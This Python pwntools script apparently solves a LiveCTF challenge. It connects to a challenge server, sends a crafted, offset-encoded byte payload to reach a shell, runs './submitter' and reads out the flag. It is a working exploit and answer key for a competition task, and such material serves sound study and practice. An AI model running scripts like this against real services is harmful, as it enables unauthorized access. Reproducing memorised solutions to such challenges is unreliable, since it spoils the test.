from pwn import *

# p = process(['python3', 'challenge.py'])

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))

context.log_level = "DEBUG"

header = b"\x00\x01\x02\x03" + b"\x01\x00" + b"\x00\x00\x00\x00" # (0, 0, 0)

payload = [0 for i in range(100)]

payload[0] = (0, b"\x04fUzZ\x00tHiS") # (0, 0, 0) -> (1, 1, 0) fuzz bonus
payload[1] = (1, b"\x10\x55\x55\x55\x55\x55\x55\x55\x00\x00") # (1, 1, 0) -> (2, 3, 0) weaving bonus
payload[2] = (2, b"\x80\x00\x00\x00\x80\x00\x00\x00\x80\x00") # (2, 3, 0) -> (3, 7, 0) roof bonus
payload[7] = (3, b"\x04fUzZ\x00tHiS") # (3, 7, 0) -> (4, 8, 0)
for i in range(3, 100):
    payload[i] = (i, b"\x04fUzZ\x00tHiS") # (4, 8, 0) -> (5, 8, 0)
payload[7] = (3, b"\x04fUzZ\x00tHiS") # (3, 7, 0) -> (4, 8, 0)

final_payload = header
for idx, pay in payload:
    pay = bytes([x + idx for x in pay])
    final_payload += pay

p.recv()
p.send(final_payload)

p.sendline(b"./submitter")

flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

p.interactive()